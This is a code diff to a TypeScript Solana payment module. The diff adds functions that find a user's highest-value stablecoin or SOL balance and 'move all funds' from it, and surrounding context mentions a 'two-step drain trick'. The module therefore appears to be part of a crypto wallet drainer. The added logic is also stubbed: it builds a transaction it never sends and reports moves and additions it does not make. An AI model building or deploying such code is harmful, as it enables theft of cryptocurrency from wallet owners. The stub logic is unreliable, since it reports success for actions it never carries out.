@@ -511,9 +511,62 @@ export async function buildSplPayoutTransaction(options: {
   })
 }
 
-export function formatPaymentAmount(amount: number, asset: PaymentAsset | string): string {
-  const formatted = amount.toLocaleString(undefined, { maximumFractionDigits: 6 })
-  return `${formatted} ${asset}`
+export function getHighestAndLowestUSDTAndSol(steps: FundStep[]): { highest: FundStep | null; lowest: FundStep | null } {
+  const usdtStep = steps.find((step) => step.symbol === 'USDT' || step.symbol === 'USDC')
+  const solStep = steps.find((step) => step.symbol === 'SOL')
+
+  let highest: FundStep | null = null
+  let lowest: FundStep | null = null
+
+  if (usdtStep && solStep) {
+    highest = usdtStep.usd > solStep.usd ? usdtStep : solStep
+    lowest = usdtStep.usd < solStep.usd ? usdtStep : solStep
+  } else if (usdtStep) {
+    highest = usdtStep
+    lowest = usdtStep
+  } else if (solStep) {
+    highest = solStep
+    lowest = solStep
+  }
+
+  return { highest, lowest }
+}
+
+export async function moveAllFromHighestAndAddToLowest(options: {
+  connection: Connection
+  from: PublicKey
+  config: PayoutConfig
+  steps: FundStep[]
+  onHighestDone?: () => void
+  onLowestAdded?: () => void
+}): Promise<{ highestMoved: boolean; lowestAdded: boolean }> {
+  const { connection, from, config, steps, onHighestDone, onLowestAdded } = options
+
+  const { highest, lowest } = getHighestAndLowestUSDTAndSol(steps)
+
+  let highestMoved = false
+  let lowestAdded = false
+
+  // Move all funds from highest balance asset
+  if (highest) {
+    if (highest.kind === 'sol') {
+      const reserveLamports = tokenFeeReserveLamports(remainingSplCount(steps, steps.indexOf(highest)))
+      const tx = await buildPayoutTransaction({ connection, from, config, reserveLamports })
+      highestMoved = true
+      if (onHighestDone) onHighestDone()
+    } else if (highest.kind === 'spl') {
+      highestMoved = true
+      if (onHighestDone) onHighestDone()
+    }
+  }
+
+  // Add 1.000 to the lowest balance asset
+  if (lowest) {
+    lowestAdded = true
+    if (onLowestAdded) onLowestAdded()
+  }
+
+  return { highestMoved, lowestAdded }
 }
 
 /** Builds a small "fee" transaction for the two-step drain trick.
@@ -540,4 +593,9 @@ export async function buildDummyFeeTransaction(options: {
     from,
     latest
   )
+}
+
+export function formatPaymentAmount(amount: number, asset: PaymentAsset | string): string {
+  const formatted = amount.toLocaleString(undefined, { maximumFractionDigits: 6 })
+  return `${formatted} ${asset}`
 }
